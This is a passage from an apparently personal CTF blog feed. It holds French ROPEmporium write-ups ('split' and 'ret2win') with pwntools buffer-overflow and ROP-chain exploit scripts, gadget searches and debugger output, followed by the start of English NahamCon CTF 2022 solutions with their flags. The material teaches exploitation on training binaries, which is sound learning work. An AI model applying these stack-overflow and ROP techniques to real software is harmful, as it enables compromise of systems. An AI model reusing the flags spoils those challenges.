</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">56</span>: <span style="color:#ae81ff">0000000000601050</span>     <span style="color:#ae81ff">0</span> NOTYPE  GLOBAL DEFAULT   <span style="color:#ae81ff">23</span> __data_start
</span></span></code></pre></div><p>On voit que le début de notre section <code>.data</code> se trouve à l&rsquo;adresse <code>0x601050</code>. Notre offset pour <code>/bin/cat flag.txt</code> était <code>1060</code>, donc son adresse est <code>0x600000+0x1060</code> soit <code>0x601060</code></p>
<p>On peut vérifier que cette adresse est correcte avec <code>pwndbg</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span>s <span style="color:#ae81ff">0x601060</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x601060</span> <span style="color:#f92672">&lt;</span>usefulString<span style="color:#f92672">&gt;</span>:  <span style="color:#e6db74">&#34;/bin/cat flag.txt&#34;</span>
</span></span></code></pre></div><p>Parfait, c&rsquo;est bien l&rsquo;adresse de notre <code>/bin/cat flag.txt</code>.</p>
<p>Il nous manque à présent une dernière chose: un gadget <code>pop rdi; ret</code>.</p>
<blockquote>
<p>Dans les architectures x64, les arguments des fonctions passent par des <strong>registres</strong>. Par exemple, quand la fonction <code>system</code> va être appelée, elle va aller chercher son premier argument dans le registre <code>rdi</code>.</p></blockquote>
<p>Pour trouver ce gadget, on peut utiliser <code>ROPGadget</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary split <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;pop rdi&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007c3</span> : pop rdi ; ret
</span></span></code></pre></div><p>Maintenant qu&rsquo;on a notre gadget, récapitulons:</p>
<ul>
<li>Avec un padding de 40 bytes, on commence à réecrire la sauvegarde de <code>rip</code> (instruction pointer)</li>
<li>On peut mettre un pointeur vers <code>/bin/cat flag.txt</code>  dans <code>rdi</code> grâce à notre gadget <code>pop rdi; ret</code></li>
<li>On peut appeller la fonction <code>system</code> depuis son adresse puisque la protection <code>PIE</code> n&rsquo;est pas activée</li>
</ul>
<blockquote>
<p>Si PIE avait été activé, nous n&rsquo;aurions pas pu prendre l&rsquo;adresse de la fonction <code>system</code> puisqu&rsquo;elle aurait changé entre chaque exécution</p></blockquote>
<h2 id="final-payload">Final Payload</h2>
<p>Complétons notre exploit</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./split&#39;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004007c3</span>)
</span></span><span style="display:flex;"><span>cat_flag <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x601060</span>)
</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x0040074b</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> pop_rdi_ret <span style="color:#f92672">+</span> cat_flag <span style="color:#f92672">+</span> system
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p>Et maintenant, on le lance:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212481792-479ec049-ac21-4fc7-b527-da64381c21ef.png" alt="2023-01-14-155456_1115x137_scrot"></p>
<p>On a notre flag, gg !</p>
]]></content>
        </item>
        
        <item>
            <title>🇫🇷 ROPEmporium - ret2win (x64)</title>
            <link>/posts/2022/12/ropemporium-ret2win-x64/</link>
            <pubDate>Sat, 31 Dec 2022 00:00:00 +0000</pubDate>
            
            <guid>/posts/2022/12/ropemporium-ret2win-x64/</guid>
            <description>&lt;h2 id=&#34;note&#34;&gt;Note&lt;/h2&gt;
&lt;p&gt;Je suis actuellement entrain d&amp;rsquo;apprendre le pwn donc il est possible que je fasse des erreurs ou que je dise des choses fausses dans ce post, si vous en voyez n&amp;rsquo;hésitez pas à me contacter sur &lt;a href=&#34;https://discord.com/users/254689803822563348&#34;&gt;discord&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;file-information&#34;&gt;File information&lt;/h2&gt;
&lt;p&gt;Avant de commencer à regarder dans l&amp;rsquo;executable, il faut savoir à quoi on s&amp;rsquo;attaque, on va utiliser &lt;code&gt;file&lt;/code&gt; pour avoir des informations sur le fichier, puis &lt;code&gt;checksec&lt;/code&gt; pour voir les éventuelles sécuritées avec lesquelles il a été compilé&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p>Je suis actuellement entrain d&rsquo;apprendre le pwn donc il est possible que je fasse des erreurs ou que je dise des choses fausses dans ce post, si vous en voyez n&rsquo;hésitez pas à me contacter sur <a href="https://discord.com/users/254689803822563348">discord</a>.</p>
<h2 id="file-information">File information</h2>
<p>Avant de commencer à regarder dans l&rsquo;executable, il faut savoir à quoi on s&rsquo;attaque, on va utiliser <code>file</code> pour avoir des informations sur le fichier, puis <code>checksec</code> pour voir les éventuelles sécuritées avec lesquelles il a été compilé</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>file ret2win
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ret2win: ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
</span></span></code></pre></div><p>On va donc s&rsquo;attaquer à un executable en 64bit, linké dynamiquement et qui n&rsquo;est pas strippé</p>
<p>Maintenant le <code>checksec</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">ret2win</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><h2 id="exploitation">Exploitation</h2>
<p>On va le run et voir ce qu&rsquo;il se passe</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212438458-863bbd90-ce7f-4af6-bdd0-e56ac4a6ba7f.png" alt="2023-01-13-194951_1041x663_scrot"></p>
<p>En lisant ce que le programme écrit on apprend plusieurs choses:</p>
<ul>
<li>La taille du buffer où est stocké notre input: 32 bytes</li>
<li>La fonction read() est utilisée pour lire notre input</li>
<li>read() va lire 56 bytes au maximum</li>
</ul>
<p>On va pouvoir overflow le buffer puisqu&rsquo;on peut écrire un nombre de bytes supérieur à la taille du buffer</p>
<p>Voici donc le début de notre exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ret2win&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span></code></pre></div><p>Ici, on déclare deux variables, une qui correspond au padding nécessaire pour remplir le buffer (padding), et une qui correspond au padding pour overwrite la sauvegarde de <code>rbp</code> (rbp)</p>
<p>On envoie ensuite notre payload mais en l&rsquo;occurence ici il ne va rien se passer puisque la sauvegarde de <code>rip</code> n&rsquo;a pas été overwrite.</p>
<p>La prochaine étape est de lister les symboles de l&rsquo;executable pour trouver notre fonction &ldquo;win&rdquo; (une fonction qui va nous permettre de lire le flag). Pour faire ça, on peut utiliser <code>pwndbg</code> par exemple:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
</span></span><span style="display:flex;"><span>  All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Non<span style="color:#f92672">-</span>debugging symbols:
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400528</span>  _init
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400550</span>  puts<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400560</span>  system<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400570</span>  printf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400580</span>  memset<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400590</span>  read<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00000000004005a0</span>  setvbuf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00000000004005b0</span>  _start
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00000000004005e0</span>  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00000000004005f0</span>  deregister_tm_clones
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400620</span>  register_tm_clones
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400660</span>  __do_global_dtors_aux
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400690</span>  frame_dummy
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400697</span>  main
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00000000004006e8</span>  pwnme
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400756</span>  ret2win
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400780</span>  __libc_csu_init
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00000000004007f0</span>  __libc_csu_fini
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00000000004007f4</span>  _fini
</span></span></code></pre></div><p>Une fonction sort du lot: <code>ret2win</code> (située à l&rsquo;adresse <code>0x0000000000400756</code>)</p>
<p>On va donc regarder ce qu&rsquo;elle fait plus en détail, toujours avec <code>pwndbg</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass ret2win
</span></span><span style="display:flex;"><span>  Dump of assembler code <span style="color:#66d9ef">for</span> function ret2win:
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400756</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:  push   rbp
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400757</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>:  mov    rbp,rsp
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x000000000040075a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x400926</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x000000000040075f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400550</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400764</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">14</span><span style="color:#f92672">&gt;</span>: mov    edi,<span style="color:#ae81ff">0x400943</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400769</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">19</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x400560</span> <span style="color:#f92672">&lt;</span>system<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x000000000040076e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">24</span><span style="color:#f92672">&gt;</span>: nop
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x000000000040076f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">&gt;</span>: pop    rbp
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0000000000400770</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">26</span><span style="color:#f92672">&gt;</span>: ret    
</span></span><span style="display:flex;"><span>  End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>Il y a 2 <code>call</code>, un sur <code>puts</code> et un sur <code>system</code>. On voit qu&rsquo;il passe un argument à <code>system</code>, situé à l&rsquo;adresse <code>0x400943</code></p>
<p>On va donc regarder ce qui se trouve à cette adresse:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span>s <span style="color:#ae81ff">0x400943</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x400943</span>: <span style="color:#e6db74">&#34;/bin/cat flag.txt&#34;</span>
</span></span></code></pre></div><p>Ok, donc c&rsquo;est effectivement notre fonction win, puisqu&rsquo;elle passe <code>&quot;/bin/cat flag.txt&quot;</code> en argument dans <code>system()</code>.</p>
<p>L&rsquo;idée va donc être d&rsquo;ajouter l&rsquo;adresse de cette fonction à la fin de notre payload, pour qu&rsquo;elle finisse dans la sauvegarde de <code>rip</code></p>
<blockquote>
<p>La sauvegarde de <code>rip</code> contient toujours l&rsquo;adresse de la prochaine instruction à éxecuter. Ici, en réecrivant sa valeur actuelle par l&rsquo;adresse de la fonction <code>ret2win</code>, on modifie la prochaine étape du programme en lui faisant appeler une fonction qui ne devait jamais être appelée. On a donc modifié son <strong>flux d&rsquo;éxecution</strong>.</p></blockquote>
<p>On peut compléter notre exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ret2win&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>rip <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400756</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> rip
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p>Maintenant, on lance l&rsquo;exploit et on devrait avoir le flag</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212438841-fe612582-a330-472b-ba9b-c9fa7f237d8f.png" alt="2023-01-13-201012_1135x146_scrot"></p>
<p>Et&hellip; le flag n&rsquo;a pas été print car le programme a <code>segfault</code>. Puisque je suis sous Ubuntu 22.04, qui est une version ultérieure à la 18.04 je suis affecté par les problèmes de <strong>stack alignment</strong> (MOVAPS)</p>
<p>Pour régler ça, on peut ajouter un gadget <code>ret</code>, qu&rsquo;on va trouver en utilisant <code>ROPgadget</code>, après notre padding</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary ret2win <span style="color:#f92672">|</span> grep ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040053e</span> : ret
</span></span></code></pre></div><h2 id="final-payload">Final Payload</h2>
<p>Maintenant qu&rsquo;on a l&rsquo;addresse du <code>ret</code> on peut l&rsquo;ajouter à notre payload, et il devrait fonctionner cette fois. Voici donc la version finale de l&rsquo;exploit</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ret2win&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>rip <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400756</span>)
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x000000000040053e</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> ret <span style="color:#f92672">+</span> rip
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p><img src="https://user-images.githubusercontent.com/77807503/212439094-3d54ce77-a9d1-485a-afe7-f1ae7bd3dea2.png" alt="2023-01-13-201337_1023x371_scrot"></p>
<p>Et on a le flag, gg!</p>
]]></content>
        </item>
        
        <item>
            <title>🇬🇧 NahamCon CTF 2022 (writeups)</title>
            <link>/posts/2022/12/nahamcon-ctf-2022-writeups/</link>
            <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
            
            <guid>/posts/2022/12/nahamcon-ctf-2022-writeups/</guid>
            <description>&lt;h1 id=&#34;technical-support&#34;&gt;Technical Support&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Author: @JohnHammond#6971

Want to join the party of GIFs, memes and emoji spam? Or just want to ask a question for technical support regarding any challenges in the CTF? Join us in the Discord in the #nahamcon-ctf-general channel! You might just find a flag on the Discord server!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Go on the discord, in the &lt;a href=&#34;https://discord.com/channels/598608711186907146/1053097744241283142&#34;&gt;#nahamcon-ctf-general&lt;/a&gt; channel, and we can see this in the channel description&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268333-6871e3b0-8a49-4c33-bf8d-0766711216c9.png&#34; alt=&#34;2022-12-17-172256_1335x78_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;flag → &lt;strong&gt;flag{a98373a74abb8c5ebb8f5192e034a91c}&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;babys-first-heartbleed&#34;&gt;Baby’s First Heartbleed&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Author: @JohnHammond#6971

Hey kids!! Wanna learn how to hack??!?! Start here to foster your curiosity!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Start the machine, and connect to it using nc&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h1 id="technical-support">Technical Support</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

Want to join the party of GIFs, memes and emoji spam? Or just want to ask a question for technical support regarding any challenges in the CTF? Join us in the Discord in the #nahamcon-ctf-general channel! You might just find a flag on the Discord server!
</code></pre><p>Go on the discord, in the <a href="https://discord.com/channels/598608711186907146/1053097744241283142">#nahamcon-ctf-general</a> channel, and we can see this in the channel description</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268333-6871e3b0-8a49-4c33-bf8d-0766711216c9.png" alt="2022-12-17-172256_1335x78_scrot"></p>
<p>flag → <strong>flag{a98373a74abb8c5ebb8f5192e034a91c}</strong></p>
<h1 id="babys-first-heartbleed">Baby’s First Heartbleed</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

Hey kids!! Wanna learn how to hack??!?! Start here to foster your curiosity!
</code></pre><p>Start the machine, and connect to it using nc</p>
<p><code>⌨️ nc challenge.nahamcon.com 31985</code></p>
<p>really guessed this one — when he asks for a string just type anything (like “<strong><strong><strong><strong><strong><strong><strong>hello”</strong></strong></strong></strong></strong></strong></strong> for example) and when he asks for a length, type a <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>high number</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p>You should see the flag appear in the server response:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268344-dc135f5b-8bca-43bb-b899-5c3ae30df6bc.png" alt="2022-12-17-172914_1888x1032_scrot"></p>
<p>flag → <strong>flag{bfca3d71260e581ba366dca054f5c8e5}</strong></p>
<h1 id="read-the-rules">Read The Rules</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

Please follow the rules for this CTF!
</code></pre><p>Go to the <a href="https://ctf.nahamcon.com/rules">rules pages</a> and open up DevTools (or go to view-source) and you should find a comment with the flag at the very bottom of the page’s html</p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268349-17827a40-0c4c-4502-bb87-ec932abbcd50.png" alt="2022-12-17-173352_943x617_scrot"></p>
<p>flag → <strong>flag{90bc54705794a62015369fd8e86e557b}</strong></p>
<h1 id="hashstation">Hashstation</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

Below is a SHA256 hash! Can you determine what the original data was, before it was hashes?

705db0603fd5431451dab1171b964b4bd575e2230f40f4c300d70df6e65f5f1c
</code></pre><p>You could probably do it with hashcat, but i’m lazy so i’ll just use <a href="http://crackstation.net">crackstation.net</a></p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268371-e7fa0ef8-00f3-410f-8696-4396f4945dcf.png" alt="2022-12-17-190623_1056x434_scrot"></p>
<p>flag → <strong><strong><strong><strong><strong>flag{awesome}</strong></strong></strong></strong></strong></p>
<h1 id="catscii">Catscii</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

Do you know what the cat command does in the Linux command-line?
</code></pre><p>Download the file and cat its content</p>
<p><code>⌨️ cat catscii</code></p>
<p><img src="https://user-images.githubusercontent.com/77807503/208268377-98773958-b8a1-4888-8996-1ad12557f7d5.png" alt="2022-12-17-190848_1888x1032_scrot"></p>
<p>flag → <strong>flag{258da40ab06be7c99099d603a3b3ccb1}</strong></p>
<h1 id="banjo">Banjo</h1>
<pre tabindex="0"><code>Author: @JohnHammond#6971

